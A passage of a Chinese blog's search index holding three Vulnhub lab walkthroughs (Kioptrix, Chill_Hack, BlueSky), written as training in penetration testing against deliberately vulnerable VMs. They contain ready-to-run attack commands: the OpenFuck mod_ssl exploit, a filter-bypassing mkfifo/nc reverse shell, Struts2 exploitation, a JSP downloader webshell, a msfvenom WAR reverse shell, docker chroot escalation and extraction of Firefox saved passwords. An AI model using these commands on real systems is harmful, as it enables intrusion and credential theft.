details: Linux 2.4.9 - 2.4.18 (likely embedded)\nNetwork Distance: 1 hop\n\nHost script results:\n|_clock-skew: 1h01m54s\n|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)\n|_smb2-time: Protocol negotiation failed (SMB2)\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.42 ms 192.168.1.102\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 69.83 seconds\n```\n\n这东西稍微的有点多，一个个看\n\n![image](image1.png)\n\n80端口好像也没啥可看的？扫个目录看看吧\n\n```\n┌──(root💀kali)-[~/Desktop]\n└─# gobuster dir -w /usr/share/dirb/wordlists/common.txt -x .php -e -t 200 -u http://192.168.1.102/\n===============================================================\nGobuster v3.1.0\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.1.102/\n[+] Method:                  GET\n[+] Threads:                 200\n[+] Wordlist:                /usr/share/dirb/wordlists/common.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.1.0\n[+] Extensions:              php\n[+] Expanded:                true\n[+] Timeout:                 10s\n===============================================================\n2021/11/12 07:52:42 Starting gobuster in directory enumeration mode\n===============================================================\nhttp://192.168.1.102/.htaccess            (Status: 403) [Size: 273]\nhttp://192.168.1.102/.htpasswd            (Status: 403) [Size: 273]\nhttp://192.168.1.102/.hta                 (Status: 403) [Size: 268]\nhttp://192.168.1.102/.htaccess.php        (Status: 403) [Size: 277]\nhttp://192.168.1.102/.htpasswd.php        (Status: 403) [Size: 277]\nhttp://192.168.1.102/.hta.php             (Status: 403) [Size: 272]\nhttp://192.168.1.102/~root                (Status: 403) [Size: 269]\nhttp://192.168.1.102/~operator            (Status: 403) [Size: 273]\nhttp://192.168.1.102/cgi-bin/             (Status: 403) [Size: 272]\nhttp://192.168.1.102/index.html           (Status: 200) [Size: 2890]\nhttp://192.168.1.102/manual               (Status: 301) [Size: 294] [--> http://127.0.0.1/manual/]\nhttp://192.168.1.102/mrtg                 (Status: 301) [Size: 292] [--> http://127.0.0.1/mrtg/]\nhttp://192.168.1.102/usage                (Status: 301) [Size: 293] [--> http://127.0.0.1/usage/]\nhttp://192.168.1.102/test.php             (Status: 200) [Size: 27]\n```\n\n挨个去看看\n\n![image](image2.png)\n\n几个页面都会跳转到127.0.0.1，只有test.php可以访问，而且还没什么东西\n\n继续回到端口看看吧\n\n```\n┌──(root💀kali)-[~/Desktop]\n└─# smbclient -L 192.168.1.102                                                                                                            1 ⨯\nprotocol negotiation failed: NT_STATUS_IO_TIMEOUT\n```\n\n## 漏洞利用\n\n看到80端口后面的mod_ssl/2.8.4，去搜一下有没有Exploit\n\n```\n┌──(root💀kali)-[~/Desktop]\n└─# searchsploit mod_ssl\n------------------------------------------------------------------------------------------------------------ ---------------------------------\n Exploit Title                                                                                              |  Path\n------------------------------------------------------------------------------------------------------------ ---------------------------------\nApache mod_ssl 2.0.x - Remote Denial of Service                                                             | linux/dos/24590.txt\nApache mod_ssl 2.8.x - Off-by-One HTAccess Buffer Overflow                                                  | multiple/dos/21575.txt\nApache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow                                        | unix/remote/21671.c\nApache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (1)                                  | unix/remote/764.c\nApache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)                                  | unix/remote/47080.c\nApache mod_ssl OpenSSL < 0.9.6d / < 0.9.7-beta2 - 'openssl-too-open.c' SSL2 KEY_ARG Overflow                | unix/remote/40347.txt\n------------------------------------------------------------------------------------------------------------ ---------------------------------\nShellcodes: No Results\n```\n\n对比mod_ssl/2.8.4版本，有三个版本合适，挨个进行测试\n\n经过测试发现unix/remote/47080.c是可以使用的，咱们给他复制出来\n\n```\n┌──(root💀kali)-[~/Desktop]\n└─# locate unix/remote/47080.c\n/usr/share/exploitdb/exploits/unix/remote/47080.c\n\n┌──(root💀kali)-[~/Desktop]\n└─# cp /usr/share/exploitdb/exploits/unix/remote/47080.c ./\n```\n\n然后使用gcc进行编译\n\n```\n┌──(root💀kali)-[~/Desktop]\n└─# gcc -o exploit 47080.c -lcrypto\n47080.c:21:10: fatal error: openssl/ssl.h: 没有那个文件或目录\n   21 | #include <openssl/ssl.h>\n      |          ^~~~~~~~~~~~~~~\ncompilation terminated.\n```\n\n提示报错了，经过百度搜索，发现是缺少了组件\n\n咱们使用apt进行安装\n\n```\n┌──(root💀kali)-[~/Desktop]\n└─# apt-get install libssl1.0-dev\n```\n\n然后再进行编译\n\n```\n┌──(root💀kali)-[~/Desktop]\n└─# gcc -o exploit 47080.c -lcrypto\n\n┌──(root💀kali)-[~/Desktop]\n└─# ls\n47080.c  exploit\n```\n\n去运行一下\n\n```\n┌──(root💀kali)-[~/Desktop]\n└─# ./exploit\n\n*******************************************************************\n* OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *\n*******************************************************************\n* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *\n* #hackarena  irc.brasnet.org                                     *\n* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *\n* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *\n* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *\n*******************************************************************\n\n: Usage: ./exploit target box [port] [-c N]\n\n  target - supported box eg: 0x00\n  box - hostname or IP address\n  port - port for ssl connection\n  -c open N connections. (use range 40-50 if u dont know)\n```\n\n运行后得到了运行参数，咱们还得先找到对应的版本\n\n```\n┌──(root💀kali)-[~/Desktop]\n└─# ./exploit | grep apache-1.3.20                                                                                                        1 ⨯\n        0x02 - Cobalt Sun 6.0 (apache-1.3.20)\n        0x27 - FreeBSD (apache-1.3.20)\n        0x28 - FreeBSD (apache-1.3.20)\n        0x29 - FreeBSD (apache-1.3.20+2.8.4)\n        0x2a - FreeBSD (apache-1.3.20_1)\n        0x3a - Mandrake Linux 7.2 (apache-1.3.20-5.1mdk)\n        0x3b - Mandrake Linux 7.2 (apache-1.3.20-5.2mdk)\n        0x3f - Mandrake Linux 8.1 (apache-1.3.20-3)\n        0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1\n        0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2\n        0x7e - Slackware Linux 8.0 (apache-1.3.20)\n        0x86 - SuSE Linux 7.3 (apache-1.3.20)\n```\n\n符合条件的有两个，分别是0x6a和0x6b，分别去测试一下\n\n```\n┌──(root💀kali)-[~/Desktop]\n└─# ./exploit 0x6a 192.168.1.102 -c 40\n\n*******************************************************************\n* OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *\n*******************************************************************\n* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *\n* #hackarena  irc.brasnet.org                                     *\n* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *\n* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *\n* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *\n*******************************************************************\n\nConnection... 40 of 40\nEstablishing SSL connection\ncipher: 0x4043808c   ciphers: 0x80f8070\nReady to send shellcode\nSpawning shell...\nGood Bye!\n```\n\n0x6a测试失败，现在去测试一下0x6b\n\n```\n┌──(root💀kali)-[~/Desktop]\n└─# ./exploit 0x6b 192.168.1.102 -c 40\n\n*******************************************************************\n* OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *\n*******************************************************************\n* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *\n* #hackarena  irc.brasnet.org                                     *\n* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *\n* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *\n* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *\n*******************************************************************\n\nConnection... 40 of 40\nEstablishing SSL connection\ncipher: 0x4043808c   ciphers: 0x80f81e8\nReady to send shellcode\nSpawning shell...\nbash: no job control in this shell\nbash-2.05$\nd.c; ./exploit; -kmod.c; gcc -o exploit ptrace-kmod.c -B /usr/bin; rm ptrace-kmo\n--09:32:52--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c\n           => `ptrace-kmod.c'\nConnecting to dl.packetstormsecurity.net:443... connected!\n\nUnable to establish SSL connection.\n\nUnable to establish SSL connection.\ngcc: ptrace-kmod.c: No such file or directory\ngcc: No input files\nrm: cannot remove `ptrace-kmod.c': No such file or directory\nbash: ./exploit: No such file or directory\nbash-2.05$\nbash-2.05$ whoami&&id\nwhoami&&id\napache\nuid=48(apache) gid=48(apache) groups=48(apache)\n```\n\n0x6b成功getshell，现在去提权\n\n## 权限提升\n\n经过测试后没有发现提权的点，但是发现了另一种root权限的方法，那就是用msf的模块\n\n```\nuse exploit/linux/samba/trans2open\nset payload linux/x86/shell_reverse_tcp\nshow options\nset rhosts 192.168.1.102\nexploit\n\nmsf6 exploit(linux/samba/trans2open) > exploit\n\n[*] Started reverse TCP handler on 192.168.1.106:4444\n[*] 192.168.1.102:139 - Trying return address 0xbffffdfc...\n[*] 192.168.1.102:139 - Trying return address 0xbffffcfc...\n[*] 192.168.1.102:139 - Trying return address 0xbffffbfc...\n[*] 192.168.1.102:139 - Trying return address 0xbffffafc...\n[*] 192.168.1.102:139 - Trying return address 0xbffff9fc...\n[*] 192.168.1.102:139 - Trying return address 0xbffff8fc...\n[*] Command shell session 1 opened (192.168.1.106:4444 -> 192.168.1.102:1036) at 2021-11-13 07:04:24 -0500\n\n[*] Command shell session 2 opened (192.168.1.106:4444 -> 192.168.1.102:1037) at 2021-11-13 07:04:25 -0500\n[*] Command shell session 3 opened (192.168.1.106:4444 -> 192.168.1.102:1038) at 2021-11-13 07:04:26 -0500\nwhoami&&id\nroot\nuid=0(root) gid=0(root) groups=99(nobody)\n```\n\n用msf的模块打就是root，至于为啥我也没研究出个所以然来（主要因为菜）\n\n知道原因的小伙伴可以告诉我一下\n","tags":["Vulnhub"]},{"title":"Chill_Hack - Vulnhub","url":"/2021/10/17/Vulnhub  - Chill_Hack/","content":"\n# Vulnhub-Chill_Hack\n\n靶场实战 Vulnhub-Chill_Hack\n\n靶场下载地址https://www.vulnhub.com/entry/chill-hack-1,622/\n\n废话不多说 直接开始\n\n第一步使用kali扫描内网IP\n\nArp-scan –l\n\n![image](image1.png)\n\n获得靶场IP为192.168.72.132\n\n对靶场进行端口扫描\n\nNmap –A –v 192.168.72.132\n\n![image](image2.png)\n\n发现存在21 22 80三个端口\n\n21端口存在匿名访问 咱们先访问看看\n\n用户名使用anonymous 密码为空\n\n![image](image3.png)\n\n成功登陆\n\n查看有什么文件\n\n![image](image4.png)\n\n发现存在一个txt文件 我们查看一下\n\n使用get下载到本地然后打开查看\n\n![image](image5.png)\n\n![image](image6.png)\n\n嗯…好像也没什么用\n\n我们还是先看看80端口的Web服务吧\n\n![image](image7.png)\n\n看上去像是一个体育比赛的官网？\n\n扫描一下目录\n\n![image](image8.png)\n\n发现了一个有趣的URL [http://192.168.72.132/secret/index.php](http://192.168.72.132/secret/index.php)\n\n可以执行命令\n\n![image](image9.png)\n\nOK 突破口应该就在这里了\n\n当我输入ls想查看一下当前目录文件的时候\n\n![image](image10.png)\n\n这时我想起来我们那个note.txt文件里的话是什么意思\n\n证明这里有过滤 就是不知道是白名单还是黑名单了\n\n经过我大量测试 该靶场为黑名单验证\n\n那就好办了 绕过吧\n\n出去吃了个饭 回来突然来了思路\n\n将两个指令结合起来 不就成了吗\n\n例如 ls会被拦截\n\n那就 whoami;ls\n\n![image](image11.png)\n\n成功执行 我可真是个小机灵\n\n将该方法和NC反弹一结合 不就拿到shell了？\n\n经过大量测试 发现可用的反弹语句为\n\ndir;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1|nc 192.168.72.130 7777 > /tmp/f\n\n本机监听 nc –lvp 7777\n\n执行 成功拿到一个shell\n\n![image](image12.png)\n\n![image](image13.png)\n\n该shell权限还是较低 并且操作非常不便利 咱们要想办法提权\n\n查找python版本\n\nWhich python\n\n![image](image14.png)\n\n成功确认python版本为python3\n\n使用python3将shell进行提升\n\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n\n![image](image15.png)\n\n成功\n\n该命令不会对电脑有什么危害 但偶尔会有奇效\n\n![image](image16.png)\n\n在这个文件夹下 这个hacker.php引起了我的注意 查看一下吧\n\n![image](image17.png)\n\n在黑暗中我会看到答案？真就人均谜语人呗\n\n在hacker.php中 我们看到images文件夹中有一张图片 应该就是线索所在\n\n咱们进入images文件夹\n\n![image](image18.png)\n\nOK 咱们把这张图片用nc下载下来 也可以用python3开启http服务进行下载 不过我图省事儿 就nc了吧\n\n本地电脑运行 nc –nvlp 4444 > hacker-with-laptop_23-2147985341.jpg\n\n咱们保持原名不动\n\nShell里运行 nc 192.168.72.130 4444 -w 4 < hacker-with-laptop_23-2147985341.jpg\n\n![image](image19.png)\n\nOK 稍等一会儿 成功下载下来\n\n根据hacker.php中的提示 在黑暗中我们会看到答案 这不就是妥妥的图片隐写吗 不愧是我 最近的柯南没白看\n\n使用steghide查看\n\n![image](image20.png)\n\n果然存在一个名为backup.zip的压缩包 不愧是我\n\n依然使用steghide进行解压\n\n![image](image21.png)\n\nOK 得到了这个名为backup.zip的压缩包文件\n\n我们现在将他解压缩\n\n![image](image22.png)\n\n我丢啊 这里来个密码 成吧 再找\n\n找？找是不可能找的 就咱这暴脾气 爆他！\n\n![image](image23.png)\n\n使用zip2johb生成了一个backup.john文件\n\n咱们使用john爆他\n\n![image](image24.png)\n\nOK 完成\n\n咱们使用john查看密码\n\n![image](image25.png)\n\n密码为pass1word 行吧 经典弱口令\n\n接下来咱们解压文件\n\n![image](image26.png)\n\n成功解压出来\n\n查看解压出来的文件\n\n![image](image27.png)\n\n好家伙 还有个base64编码 解密吧\n\n![image](image28.png)\n\n返回我们的shell 查看一下用户\n\n![image](image29.png)\n\n使用我们得到的密码登入进用户anurodh\n\n![image](image30.png)\n\n成功登入\n\n确认账户密码没问题了 这时候咱们就要用到一开始扫描出的22端口了\n\n毕竟shell是不稳定的 使用ssh服务登入吧\n\n![image](image31.png)\n\n成功登入 有一个稳定的权限的感觉太爽了\n\n这时候肯定就是提权了是吧\n\n直接使用经典的sudo su\n\n![image](image32.png)\n\n失败了 嗯… 情理之中 意料之外\n\n使用sudo –l查看sudo的权限 发现apaar可以提权？那就造他\n\n![image](image33.png)\n\n查看apaar文件夹下的文件\n\n![image](image34.png)\n\n发现apaar下有个txt文件 但由于权限文件我们无法访问\n\n但上述提到了 apaar下有个sh脚本我们可以执行 那就执行它\n\n![image](image35.png)\n\n它需要一个名字 咱们随便输入即可\n\n![image](image36.png)\n\n执行完毕了 但我不知道它有效果\n\n那就阅读一下吧\n\n![image](image37.png)\n\n这个批处理 有点意思啊 似乎可以命令执行\n\n![image](image38.png)\n\n尝试成功 有点意思\n\n既然我们没有权限读取local.txt文件 那就让apaar来读取吧\n\n![image](image39.png)\n\n啊这 我还以为是什么提权的东西呢 结果你告诉我 这就是个flag？\n\n那也行吧 flag1 get {USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}\n\nOK 咱们继续找其他方法提权吧\n\n输入id查看权限\n\n![image](image40.png)\n\n嗯？docker？要素察觉\n\n我们使用一些提权辅助工具[https://gtfobins.github.io/](https://gtfobins.github.io/) 在里面搜搜docker\n\n![image](image41.png)\n\n使用此命令即可提权docker run -v /:/mnt --rm -it alpine chroot /mnt sh\n\n![image](image42.png)\n\n![image](image43.png)\n\n提权成功\n\n进入root目录 拿到最后一个flag\n\n![image](image44.png)\n\nFlag2 get {ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}\n\n总结语：怎么说呢，这个靶场还是挺有意思的。我起初以为就是简单的一个命令执行getshell以后一个脚本提权就拿下了。没想到还有这么多步骤，挺严谨的吧\n","tags":["Vulnhub"]},{"title":"BlueSky - Vulnhub","url":"/2021/10/07/Vulnhub  - BlueSky/","content":"\n# 靶场实战 Vulnhub-BlueSky\n\n首先使用kali扫描靶场的IP地址\n\nArp-scan –l\n\n![image](image1.png)\n\n对比MAC地址 成功得到靶场IP地址192.168.72.131\n\n进行端口扫描\n\nNmap –Sv –v 192.168.72.131\n\n![image](image2.png)\n\n开放了端口22和8080\n\n22为SSH端口，突破多半都是弱口令，咱们先不考虑这种情况，访问8080的WEB服务器看看\n\n[http://192.168.72.131:8080](http://192.168.72.131:8080/)\n\n![image](image3.png)\n\n访问后发现是tomcat 9.0.40 第一时间想到了tomcat的cve漏洞\n\n使用searchsploit搜索 tomcat 9.0.40的漏洞\n\n![image](image4.png)\n\n嗯…好像没有\n\n那就测试一波0day吧(弱口令)\n\nTomcat/tomcat\n\nAdmin/admin\n\n![image](image5.png)\n\nOK 确认没有0day\n\n那就只能找该版本存在的漏洞了\n\n在百度找到一个struts2-showcase的漏洞（s2-048远程代码执行）\n\n好家伙 直接上工具了哈 就懒得再测试了\n\nurl: [http://192.168.72.131:8080/struts2-showcase/index.action](http://192.168.72.131:8080/struts2-showcase/index.action)\n\n![image](image6.png)\n\n好家伙 这个URL我爆目录还没爆出来 在网上搜索相关漏洞才找到\n\n下载exp\n\ngit clone [https://github.com/jrrdev/cve-2017-5638.git](https://github.com/jrrdev/cve-2017-5638.git)\n\n测试是否存在漏洞\n\npython exploit.py \"http://192.168.72.131:8080/struts2-showcase/index.action\" \"whoami\"\n\n![image](image7.png)\n\nwhoami执行成功\n\n查看是否存在nc权限\n\npython exploit.py \"http://192.168.72.131:8080/struts2-showcase/index.action\" \"nc\"\n\n![image](image8.png)\n\n存在nc权限的 但似乎没有nc –e的权限 得通过其他方式反弹shell了\n\n首先使用mknod建立管道\n\nPython exploit.py \"http://192.168.72.131:8080/struts2-showcase/index.action\" \"mknod /tmp/backpipe p\"\n\n![image](image9.png)\n\nKali监听4444端口\n\nNc –nvlp 4444\n\n![image](image10.png)\n\n反弹shell，将内容传递物使用管道文件p作为桥梁，进行数据重定向传递\n\npython exploit.py \"http://192.168.72.131:8080/struts2-showcase/index.action\" -c \"/bin/sh 0</tmp/p | nc 192.168.72.133 4444 1>/tmp/p\"\n\n![image](image11.png)\n\n正常来说现在kali是会获取到一个nc的shell的，但我这边不知道什么原因无法成功，先教大家此方法继续操作的方法，我再演示我自己做的替代的方法\n\n获取到shell后在shell内运行\n\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n\n因为靶机环境内没有python2的环境，所以我们使用python3提升为一个交互式shell就可以了\n\n第二种方法：\n\n第二种方法我们使用window来进行渗透\n\n首先使用struts2的图形化验证工具进行漏洞验证\n\n![image](image12.png)\n\n得到目录地址\n\nwebpath:/usr/local/tomcat/webapps/struts2-showcase/\n\n直接上传大马会超出字节限制\n\n上传冰蝎的马冰蝎会无法识别webshell的密码\n\n直接上传蚁剑的马也会超出字节限制\n\n那么怎么办呢？\n\n很好解决，首先我们上传一个下载文件的一句话木马\n\n![image](image13.png)\n\n得到webshell地址\n\n[http://192.168.72.131:8080/struts2-showcase/111.jsp](http://192.168.72.131:8080/struts2-showcase/111.jsp)\n\n然后在本地搭建一个web服务器，把要使用的一句话木马或大马放在里面，使用该一句话木马进行访问下载\n\n[http://192.168.72.131:8080/struts2-showcase/111.jsp?f=/usr/local/tomcat/webapps/struts2-showcase/222.jsp&u=http://192.168.0.159/333.jsp](http://192.168.72.131:8080/struts2-showcase/111.jsp?f=/usr/local/tomcat/webapps/struts2-showcase/222.jsp&u=http://192.168.0.159/333.jsp)\n\n上面的222.jsp是要保存的webshell马名字\n\n333.jsp是我们在本地web服务器内储存的名字\n\n111.jsp是当前的下载马\n\n![image](image14.png)\n\n成功下载蚁剑的一句话木马\n\n![image](image15.png)\n\n可以成功访问文件，但我们发现该一句话木马似乎无法执行命令，那怎么办呢？\n\n小问题，我们利用tomcat本身的漏洞进行提权就好了\n\n首先找到tomcat的账号木马\n\n地址：/usr/local/tomcat/conf/tomcat-users.xml\n\n第45行\n\n<user username=\"admin\" password=\"6mzf3>gfZ.pN8_Mp\" roles=\"manager-gui\"/>\n\n成功得到\n\n账号：admin\n\n密码：6mzf3>gfZ.pN8_Mp\n\n![image](image16.png)\n\n注意：此方法较为麻烦，主要用于无法使用nc弹回shell的情况下使用，我这边使用了各个方法都无法弹回，不得已之下才使用这个方法\n\n现在我们回到网页去登录账号密码\n\n![image](image17.png)\n\n登陆后的状态\n\n![image](image18.png)\n\n我们发现下面可以部署文件，OK 那就好办了\n\n使用WAR木马上传反弹shell就搞定了\n\n使用msfvenom生成war马\n\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.72.133 LPORT=5555 -f war -o shell.war\n\n![image](image19.png)\n\nOK 我们去上传\n\n![image](image20.png)\n\n成功上传后，我们可以看到/shell 这就是我们上传的war马\n\n在kali中监听5555端口\n\nNc –nvlp 5555\n\n![image](image21.png)\n\n然后去访问我们上传的war马\n\ncurl http://192.168.72.131:8080/shell/\n\n![image](image22.png)\n\nOK 我们成功获取到一个shell\n\n![image](image23.png)\n\n同样的我们使用python3获取一个交互式shell\n\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n\n![image](image24.png)\n\n查看user.txt文件 成功获取user账户的flag\n\n![image](image25.png)\n\n我们查看所有文件\n\nLs –a\n\n![image](image26.png)\n\n在用户根目录下发现mozilla firefox浏览器文件\n\n对我来说，最想要得到的就是它的用户名密码记录\n\n不同版本的Firefox保存密码记录的文件名称不同，在网上找到firefox浏览器存储用户名密码的文件是logins.json（版本号大于等于32.0）或者signons.sqlite（版本号大于等于3.5，小于32.0），\n\n具体信息参考：[http://kb.mozillazine.org/Profile_folder_-_Firefox](http://kb.mozillazine.org/Profile_folder_-_Firefox)\n\n进入位置\n\n.mozilla/firefox/fvbljmev.default-release\n\n可以看到两个文件\n\nkey4.db logins.json\n\n我们要把这两个文件搞出来\n\n使用python3开启web服务器\n\npython3 -m http.server 6666\n\n使用wget成功拷贝两个文件\n\nwget [http://192.168.72.131:6666/logins.json](http://192.168.72.131:6666/logins.json)\n\nwget [http://192.168.72.131:6666/key4.db](http://192.168.72.131:6666/key4.db)\n\n![image](image27.png)\n\n下载解密脚本\n\n[https://github.com/lclevy/firepwd](https://github.com/lclevy/firepwd)\n\ngit clone https://github.com/lclevy/firepwd.git\n\ncd firepwd\n\npip3 install -r requirements.txt\n\n![image](image28.png)\n\n运行python3 firepwd.py\n\n[https://twitter.com:b'minhtuan',b'skysayohyeah](https://twitter.com:b'minhtuan',b'skysayohyeah)'\n\n得到账号：minhtuan\n\n得到密码：skysayohyeah\n\n我们使用sudo –l查看sudo权限\n\n![image](image29.png)\n\n权限挺高 直接sudo su即可成功提权\n\n![image](image30.png)\n\n![image](image31.png)\n\n成功拿到root权限的flag\n\n本次靶场完成\n","tags":["Vulnhub"]}]